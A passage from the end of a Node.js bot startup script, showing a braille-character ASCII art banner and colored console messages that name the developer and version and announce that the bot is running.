⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠤⢤⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢋⣉⣀⣠⣄⣀⣈⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣯⠴⠚⠉⠉⠀⠀⠀⠀⣤⠏⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡇⠁⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⠿⢛⠁⠁⣸⠀⠀⠀⠀⠀⣤⣾⠵⠚⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⡀⠀⣠⠀⡇⢧⠀⠀⢀⣠⡾⡇⠀⠀⠀⠀⠀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠘⣿⠀⣀⡠⠞⠛⠁⠂⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⡦⣞⡿⣷⠸⣄⣡⢾⡿⠁⠀⠀⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠐⠠⡤⣾⣙⣶⡶⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡷⠰⣔⣾⣖⣾⡷⢿⣐⣀⣀⣤⢾⣋⠁⠀⠀⠀⣀⢀⣀⣀⣀⣀⠀⢀⢿⠑⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⡦⠴⠴⠤⠦⠤⠤⠤⠤⠤⠴⠶⢾⣽⣙⠒⢺⣿⣿⣿⣿⢾⠶⣧⡼⢏⠑⠚⠋⠉⠉⡉⡉⠉⠉⠹⠈⠁⠉⠀⠨⢾⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⠐⠀⠀⠀⠈⣇⡿⢯⢻⣟⣇⣷⣞⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣆⠀⠀⠀⠀⢠⡷⡛⣛⣼⣿⠟⠙⣧⠅⡄⠀⠀⠀⠀⠀⠀⠰⡆⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢶⠏⠉⠀⠀⠀⠀⠀⠿⢠⣴⡟⡗⡾⡒⠖⠉⠏⠁⠀⠀⠀⠀⣀⢀⣠⣧⣀⣀⠀⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⣠⣷⢿⠋⠁⣿⡏⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⢭⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⢏⡵⠛⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠀⠀⠀⠀⢿⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣼⠛⣲⡏⠁⠀⠀⠀⠀⠀⢀⣠⡾⠋⠉⠀⠀⠀⠀⠀⠀⢾⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡴⠟⠀⢰⡯⠄⠀⠀⠀⠀⣠⢴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⠁⠁⠀⠘⠧⠤⢤⣤⠶⠏⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣇⠂⢀⣀⣀⠤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.white("⟐ EL-SALVADOR FOREVER"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("Pianz Mantap Wok"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("I\n\n"));
    console.log(chalk.bold.green("Bot Is Running. . ."));
})();
